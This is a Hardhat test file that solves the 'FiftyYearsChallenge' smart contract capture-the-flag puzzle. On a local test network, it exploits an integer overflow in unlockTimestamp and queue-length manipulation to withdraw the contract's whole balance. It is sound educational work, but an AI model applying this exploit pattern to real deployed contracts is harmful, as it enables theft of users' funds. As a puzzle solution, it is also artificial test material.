import { expect } from "chai";
import { ethers } from "hardhat";

describe("FiftyYearsChallenge", function () {
  it("should return true if we empty the smart contract", async function () {
    const [, player] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory("FiftyYearsChallenge");
    const challengeDeploy = await Challenge.deploy(player.address, {
      value: ethers.utils.parseEther("1"),
    });
    await challengeDeploy.deployed();

    const challenge = challengeDeploy.connect(player);

    // Add a new Contribution that allows us to overflow `unlockTimestamp` to 0
    const upsertTx1 = await challenge.upsert(
      1, // Insert at queue position 1
      ethers.constants.MaxUint256.sub(86400 - 1),
      {
        value: 1, // Ensure `queue.length` is 1 before we push
      }
    );
    await upsertTx1.wait();

    // Add a new contribution with a timestamp before today
    const upsertTx2 = await challenge.upsert(2, 0, {
      value: 2, // Set `queue.length` to 2
    });
    await upsertTx2.wait();

    await challenge.withdraw(2);

    expect(await challengeDeploy.isComplete()).to.equal(true);
  });
});
